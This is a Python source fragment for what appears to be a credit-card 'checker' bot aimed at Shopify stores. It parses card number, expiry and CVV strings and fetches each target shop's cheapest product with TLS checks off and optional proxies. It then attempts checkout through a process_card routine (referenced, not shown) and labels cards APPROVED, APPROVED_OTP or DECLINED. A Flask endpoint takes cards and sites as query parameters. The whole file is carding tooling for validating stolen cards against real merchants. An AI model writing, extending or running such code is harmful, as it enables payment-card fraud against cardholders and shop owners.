DEFAULT_ADDRESS = ADDRESSES['US']

def get_address_for_country(country_code):
    """Return address dict for given country code, or default if not found."""
    return ADDRESSES.get(country_code.upper(), DEFAULT_ADDRESS)

# Override the pick_addr function to use the new address database and add country detection
def pick_addr(url, cc=None, rc=None):
    """Enhanced address picker that uses the new ADDRESSES database."""
    # Try to detect country from URL or use fallback
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    tld_map = {
        'US': 'US', 'CA': 'CA', 'GB': 'GB', 'AU': 'AU', 'DE': 'DE',
        'FR': 'FR', 'IN': 'IN', 'IT': 'IT', 'ES': 'ES', 'NL': 'NL',
        'NZ': 'NZ', 'CH': 'CH', 'HK': 'HK', 'AE': 'AE', 'CN': 'CN'
    }
    country = tld_map.get(tcn)
    if country:
        return get_address_for_country(country)
    # Fallback based on currency if provided
    if cc and cc in C2C:
        return get_address_for_country(C2C[cc])
    return DEFAULT_ADDRESS

# ==================== PRODUCT FETCHING ====================
def fetch_cheapest_product_sync(site_url, proxy=None):
    """Synchronous version to get cheapest product – used by the main wrapper."""
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        session = requests.Session()
        session.verify = False
        if proxy:
            proxy_dict = {'http': proxy, 'https': proxy}
            session.proxies = proxy_dict
        resp = session.get(f"{site_url}/products.json?limit=50", timeout=10)
        if resp.status_code != 200:
            return None
        data = resp.json()
        min_price = float('inf')
        min_variant = None
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if not variant.get('available', True):
                    continue
                try:
                    price = float(variant['price'])
                    if price < min_price and price > 0:
                        min_price = price
                        min_variant = {
                            'variant_id': variant['id'],
                            'price': f"{price:.2f}",
                            'product_title': product.get('title', '')
                        }
                except:
                    continue
        return min_variant
    except Exception:
        return None

# ==================== SYNCHRONOUS WRAPPER ====================
def check_site_shopify_direct(site_url, cc, proxy=None):
    """Synchronous wrapper that returns a dict compatible with your bot."""
    try:
        # Parse CC
        parts = cc.split('|')
        if len(parts) != 4:
            return {
                'Response': 'Invalid CC format',
                'status': 'ERROR',
                'gateway': 'Shopify Payments',
                'price': '0.00',
                'site': site_url
            }
        card_number, month, year, cvv = parts
        month = month.zfill(2)
        if len(year) == 2:
            year = f"20{year}"

        # Get cheapest product to get variant_id (if not provided)
        variant_id = None
        price = "0.00"
        product_info = fetch_cheapest_product_sync(site_url, proxy)
        if product_info:
            variant_id = product_info['variant_id']
            price = product_info['price']
        else:
            return {
                'Response': 'No product found',
                'status': 'ERROR',
                'gateway': 'Shopify Payments',
                'price': '0.00',
                'site': site_url
            }

        # Run the async card processing
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, total_price, currency = loop.run_until_complete(
                process_card(card_number, month, year, cvv, site_url, variant_id, proxy)
            )
        finally:
            loop.close()

        if success:
            if "ORDER_PLACED" in message:
                status = "APPROVED"
            elif "OTP_REQUIRED" in message:
                status = "APPROVED_OTP"
            else:
                status = "DECLINED"
        else:
            status = "ERROR"
        return {
            'Response': message,
            'status': status,
            'gateway': gateway,
            'price': total_price if total_price != "0.00" else price,
            'site': site_url,
            'message': message
        }

    except Exception as e:
        return {
            'Response': f"Exception: {str(e)}",
            'status': 'ERROR',
            'gateway': 'Shopify Payments',
            'price': '0.00',
            'site': site_url
        }

# ==================== RESPONSE PROCESSING ====================
def process_response_shopify(api_response, price='0.00'):
    """Convert the dict from check_site_shopify_direct to the format expected by the bot."""
    if api_response and isinstance(api_response, dict):
        response = api_response.get('Response', 'Unknown')
        status = api_response.get('status', 'ERROR')
        gateway = api_response.get('gateway', 'Shopify Payments')
        return response, status, gateway
    return "No response", "ERROR", "Shopify Payments"

# ==================== FLASK ENDPOINT (optional) ====================
app = Flask(__name__)

@app.route('/shopify', methods=['GET'])
def shopify_checker_endpoint():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')
        if not site or not cc_string:
            return jsonify({"error": "Missing 'site' or 'cc'", "status": False}), 400
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts['cc']; mes = cc_parts['mes']; ano = cc_parts['ano']; cvv = cc_parts['cvv']
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        variant_id = request.args.get('variant')
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()
        clean_response = extract_clean_response(message)
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }
        return jsonify(response_data)
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
